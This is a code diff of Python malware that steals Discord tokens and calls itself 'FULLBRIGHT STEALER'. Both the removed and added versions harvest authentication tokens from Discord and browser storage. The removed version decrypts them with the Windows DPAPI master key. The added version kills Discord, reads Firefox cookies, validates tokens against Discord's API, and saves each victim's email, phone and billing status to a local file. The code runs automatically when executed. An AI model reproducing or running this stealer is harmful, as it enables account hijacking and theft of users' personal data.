@@ -1,95 +1,146 @@
-import base64
-import json
-import os
-import re
-import requests
-from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
-class TokenExtractor:
-    def __init__(self) -> None:
-        self.base_url = "https://discord.com/api/v9/users/@me"
+import os, re, requests, psutil
+import sqlite3
+
+class DiscordToken:
+    def __init__(self):
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
+        self.vault_path = os.path.join(self.roaming, "vault")
+        self.token_file = os.path.join(self.vault_path, "token.txt")
+        self.chrome_path = os.path.join(self.appdata, "Google", "Chrome", "User Data")
+        self.edge_path = os.path.join(self.appdata, "Microsoft", "Edge", "User Data")
+        self.firefox_path = os.path.join(self.appdata, "Mozilla", "Firefox", "Profiles")
+        self.discord_path = os.path.join(self.roaming, "discord", "Local Storage", "leveldb")
         self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
-        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
-        self.tokens, self.uids = [], []
-        self.extract() 
-    def extract(self) -> None:
-        paths = {
-            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
-            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
-            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
-            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
-            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
-            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
-            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
-            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
-            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-        }
-        for name, path in paths.items():
-            if not os.path.exists(path):
-                continue
-            _discord = name.replace(" ", "").lower()
-            if "cord" in path:
-                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
-                    continue
-                for file_name in os.listdir(path):
-                    if file_name[-3:] not in ["log", "ldb"]:
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for y in re.findall(self.regexp_enc, line):
-                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]),
-                                                     self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
-                            if self.validate_token(token):
-                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
-                                if uid not in self.uids:
-                                    self.tokens.append(token)
-                                    self.uids.append(uid)
+        self.tokens = []
+        self.valid_tokens = []
+        self.user_data = []
+        self.create_vault_dir()
+        self.kill_discord()
+        self.run()
+    def kill_discord(self):
+        for proc in psutil.process_iter(['pid', 'name']):
+            if 'discord.exe' in proc.info['name'].lower():
+                proc.terminate()        
+
+    def create_vault_dir(self):
+        if not os.path.exists(self.vault_path):
+            os.makedirs(self.vault_path)
+
+    def scan_folders(self):
+        folders = []
+        if os.path.exists(self.chrome_path):
+            folders.extend([
+                os.path.join(self.chrome_path, folder)
+                for folder in os.listdir(self.chrome_path)
+                if os.path.isdir(os.path.join(self.chrome_path, folder))
+                and folder not in ("System Profile", "Guest Profile")
+            ])
+        if os.path.exists(self.edge_path):
+            folders.extend([
+                os.path.join(self.edge_path, folder)
+                for folder in os.listdir(self.edge_path)
+                if os.path.isdir(os.path.join(self.edge_path, folder))
+                and folder not in ("System Profile", "Guest Profile")
+            ])
+        if os.path.exists(self.firefox_path):
+            folders.extend([
+                os.path.join(self.firefox_path, folder)
+                for folder in os.listdir(self.firefox_path)
+                if os.path.isdir(os.path.join(self.firefox_path, folder))
+                and not folder.endswith(".default-release")
+            ])
+        if os.path.exists(self.discord_path): 
+            folders.append(self.discord_path)
+        return folders
+
+    def extract_tokens(self, path):
+        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
+        if os.path.exists(leveldb_path):
+            for filename in os.listdir(leveldb_path):
+                full_file_path = os.path.join(leveldb_path, filename)
+                if filename.endswith(".ldb") or filename.endswith(".log"):
+                    try:
+                        with open(full_file_path, "r", encoding="utf-8", errors="ignore") as f:
+                            found_tokens = re.findall(self.regexp, f.read())
+                            for token in found_tokens:
+                                if not token.startswith("MT"):
+                                    token = "MT" + token
+                                self.tokens.append(token)
+                    except Exception as e:
+                        return
+
+        firefox_profile_path = os.path.join(path, "cookies.sqlite")
+        if os.path.exists(firefox_profile_path):
+            try:
+                conn = sqlite3.connect(firefox_profile_path)
+                cursor = conn.cursor()
+                cursor.execute("SELECT value FROM cookies WHERE host = 'discord.com'")
+                rows = cursor.fetchall()
+                for row in rows:
+                    found_tokens = re.findall(self.regexp, row[0])
+                    for token in found_tokens:
+                        if not token.startswith("MT"):
+                            token = "MT" + token
+                        self.tokens.append(token)
+                conn.close()
+            except sqlite3.Error as e:
+                return
+
+    def validate_token(self, token):
+        url = "https://discord.com/api/v9/users/@me"
+        headers = {"Authorization": token}
+        try:
+            response = requests.get(url, headers=headers)
+            if response.status_code == 200:
+                user_info = response.json()
+                username = user_info.get("username", "N/A")
+                user_id = user_info.get("id", "N/A")
+                nitro = user_info.get("premium_type", 0) != 0
+                billing = user_info.get("billing_info", None) is not None
+                phone = user_info.get("phone", "N/A")
+                avatar = user_info.get("avatar", "N/A")
+                discriminator = user_info.get("discriminator", "N/A")
+                email = user_info.get("email", "N/A")
+                
+                self.valid_tokens.append(token)
+                self.user_data.append({
+                    "username": username,
+                    "user_id": user_id,
+                    "token": token,
+                    "nitro": nitro,
+                    "billing": billing,
+                    "phone": phone,
+                    "avatar": avatar,
+                    "discriminator": discriminator,
+                    "email": email,
+                })
             else:
-                for file_name in os.listdir(path):
-                    if file_name[-3:] not in ["log", "ldb"]:
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for token in re.findall(self.regexp, line):
-                            if self.validate_token(token):
-                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
-                                if uid not in self.uids:
-                                    self.tokens.append(token)
-                                    self.uids.append(uid)
-    def validate_token(self, token: str) -> bool:
-        r = requests.get(self.base_url, headers={'Authorization': token})
-        return r.status_code == 200
-
-    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
-        iv = buff[3:15]
-        payload = buff[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)
-        return decrypted_pass[:-16].decode()
-
-    def get_master_key(self, path: str) -> str:
-        if not os.path.exists(path):
+                return
+        except requests.RequestException as e:
             return
-        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
-            return
-        with open(path, "r", encoding="utf-8") as f:
-            c = f.read()
-        local_state = json.loads(c)
-        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        master_key = master_key[5:]
-        return CryptUnprotectData(master_key, None, None, None, 0)[1]
-    def save_tokens(self) -> None:
-        tokens_dir = os.path.join(self.roaming, 'vault', 'token')
-        os.makedirs(tokens_dir, exist_ok=True)
-        tokens_path = os.path.join(tokens_dir, 'token.txt')
-        with open(tokens_path, 'w') as f:
-            for token in self.tokens:
-                f.write(f"{token}\n")
+
+    def save_tokens(self):
+        if self.valid_tokens:
+            with open(self.token_file, "w") as file:
+                file.write("----------------------------FULLBRIGHT STEALER BY RAYWZW----------------------------\n\n")
+                for user in self.user_data:
+                    file.write(f"Token: {user['token']}\n")
+                    file.write(f"Username: {user['username']}\n")
+                    file.write(f"User ID: {user['user_id']}\n")
+                    file.write(f"Nitro: {user['nitro']}\n")
+                    file.write(f"Billing Info: {user['billing']}\n")
+                    file.write(f"Phone: {user['phone']}\n")
+                    file.write(f"Avatar: {user['avatar']}\n")
+                    file.write(f"Discriminator: {user['discriminator']}\n")
+                    file.write(f"Email: {user['email']}\n")
+                    file.write("----------------------------\n")
+
+    def run(self):
+        for folder in self.scan_folders():
+            self.extract_tokens(folder)
+        for token in self.tokens:
+            self.validate_token(token)
+        self.save_tokens()
+
+DiscordToken()
